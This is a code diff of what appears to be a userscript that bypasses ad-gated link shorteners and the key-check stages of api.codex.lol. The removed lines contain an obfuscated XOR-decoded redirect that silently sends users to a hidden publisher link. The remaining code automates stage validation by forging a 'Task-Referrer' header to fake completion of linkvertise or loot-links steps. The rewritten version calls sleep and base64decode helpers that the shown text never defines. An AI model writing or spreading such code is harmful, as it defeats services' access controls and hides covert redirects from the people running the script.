@@ -1,11 +1,4 @@
-function decryptData(e, t = 5) {
-    let a = "",
-        o = atob(e),
-        n = o.substring(0, t),
-        i = o.substring(t);
-    for (let s = 0; s < i.length; s++) a += String.fromCharCode(i.charCodeAt(s) ^ n.charCodeAt(s % n.length));
-    return a
-}! function() {
+! function() {
     "use strict";
     if ("adshnk.com" === window.location.hostname || "adshrink.it" === window.location.hostname) {
         let e = setInterval(() => {
@@ -55,7 +48,7 @@ function decryptData(e, t = 5) {
     u in h && window.location.replace(`https://${h[u]}`), u.includes("btteam.top/checkpoint/checkpoint-1.php") && setTimeout(() => {
         window.location.replace("https://btteam.top/checkpoint/redirect-workink.php")
     }, "3000")
-}(), "object" == typeof p && p?.PUBLISHER_LINK && decryptData(p.PUBLISHER_LINK) && window.location.assign(decryptData(p.PUBLISHER_LINK));
+}()
 const util = {
     sleep: function(e) {
         return new Promise(t => setTimeout(t, e))
@@ -135,86 +128,123 @@ const util = {
     }
 };
 async function codex() {
-    let e;
-    for (; !e;) e = localStorage.getItem("android-session"), await util.sleep(1e3);
-    async function t() {
-        let t = await (await fetch("https://api.codex.lol/v1/stage/stages", {
-            method: "GET",
+    let session;
+    while (!session) {
+        session = localStorage.getItem("android-session");
+        await sleep(1000);
+    }
+    if (document?.getElementsByTagName('a')?.length && document.getElementsByTagName('a')[0].innerHTML.includes('Get started')) {
+        document.getElementsByTagName('a')[0].click();
+    }
+    async function getStages() {
+        let response = await fetch('https://api.codex.lol/v1/stage/stages', {
+            method: 'GET',
             headers: {
-                "Android-Session": e
+                'Android-Session': session
             }
-        })).json();
-        if (t.success) return t.authenticated ? [] : t.stages;
-        window.location.reload()
-    }
-    async function a(t) {
-        let a = await (await fetch("https://api.codex.lol/v1/stage/initiate", {
-            method: "POST",
-            headers: {
-                "Android-Session": e,
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                stageId: t
-            })
-        })).json();
-        if (a.success) return a.token;
-        window.location.reload()
-    }
-    async function o(t, a) {
-        let o = await (await fetch("https://api.codex.lol/v1/stage/validate", {
-            method: "POST",
-            headers: {
-                "Android-Session": e,
-                "Content-Type": "application/json",
-                "Task-Referrer": a
-            },
-            body: JSON.stringify({
-                token: t
-            })
-        })).json();
-        if (o.success) return o.token;
-        window.location.reload()
-    }
-    async function n(t) {
-        if ((await (await fetch("https://api.codex.lol/v1/stage/authenticate", {
-                method: "POST",
-                headers: {
-                    "Android-Session": e,
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    tokens: t
-                })
-            })).json()).success) return !0;
-        window.location.reload()
-    }
-
-    function i(e) {
-        let t = e.split(".")[1];
-        return JSON.parse(atob(t = t.replace(/-/g, "+").replace(/_/g, "/")))
-    }
-    document?.getElementsByTagName("a")?.length && document.getElementsByTagName("a")[0].innerHTML.includes("Get started") && document.getElementsByTagName("a")[0].click();
-    let s = await t(),
-        c = 0;
-    for (; localStorage.getItem(s[c]) && c < s.length;) c++;
-    if (c == s.length) return;
-    let l = [];
-    try {
-        for (; c < s.length;) {
-            let r = s[c].uuid,
-                h = await a(r);
-            await util.sleep(6e3);
-            let u = i(h),
-                d, m = await o(h, d = u.link.includes("loot-links") ? "https://loot-links.com/" : u.link.includes("loot-link") ? "https://loot-link.com/" : "https://linkvertise.com/");
-            l.push({
-                uuid: r,
-                token: m
-            }), c++
+        });
+        let data = await response.json();
+        if (data.success) {
+            if (data.authenticated) {
+                return [];
+            }
+            return data.stages;
         }
-        n(l) && window.location.reload()
-    } catch (f) {
-        window.location.reload()
+        else {
+            window.location.reload();
+        }
+    }
+    async function initiateStage(stageId) {
+        let response = await fetch('https://api.codex.lol/v1/stage/initiate', {
+            method: 'POST',
+            headers: {
+                'Android-Session': session,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ stageId })
+        });
+        let data = await response.json();
+        if (data.success) {
+            return data.token;
+        }
+        else {
+            window.location.reload();
+        }
+    }
+    async function validateStage(token, referrer) {
+        let response = await fetch('https://api.codex.lol/v1/stage/validate', {
+            method: 'POST',
+            headers: {
+                'Android-Session': session,
+                'Content-Type': 'application/json',
+                'Task-Referrer': referrer
+            },
+            body: JSON.stringify({ token })
+        });
+        let data = await response.json();
+        if (data.success) {
+            return data.token;
+        }
+        else {
+            window.location.reload();
+        }
+    }
+    async function authenticate(validatedTokens) {
+        let response = await fetch('https://api.codex.lol/v1/stage/authenticate', {
+            method: 'POST',
+            headers: {
+                'Android-Session': session,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ tokens: validatedTokens })
+        });
+        let data = await response.json();
+        if (data.success) {
+            return true;
+        }
+        else {
+            window.location.reload();
+        }
+    }
+    function decodeTokenData(token) {
+        let data = token.split(".")[1];
+        data = base64decode(data);
+        return JSON.parse(data);
+    }
+    let stages = await getStages();
+    let stagesCompleted = 0;
+    while (localStorage.getItem(stages[stagesCompleted]) && stagesCompleted < stages.length) {
+        stagesCompleted++;
+    }
+    if (stagesCompleted == stages.length) {
+        return;
+    }
+    let validatedTokens = [];
+    try {
+        while (stagesCompleted < stages.length) {
+            let stageId = stages[stagesCompleted].uuid;
+            let initToken = await initiateStage(stageId);
+            let tokenData = decodeTokenData(initToken);
+            let referrer;
+            if (tokenData.link.includes('loot-links')) {
+                referrer = 'https://loot-links.com/';
+            }
+            else if (tokenData.link.includes('loot-link')) {
+                referrer = 'https://loot-link.com/';
+            }
+            else {
+                referrer = 'https://linkvertise.com/';
+            }
+            let validatedToken = await validateStage(initToken, referrer);
+            validatedTokens.push({ uuid: stageId, token: validatedToken });
+            stagesCompleted++;
+        }
+        if (authenticate(validatedTokens)) {
+            window.location.reload();
+        }
+    }
+    catch (e) {
+        window.location.reload();
     }
 }
 async function arceus() {
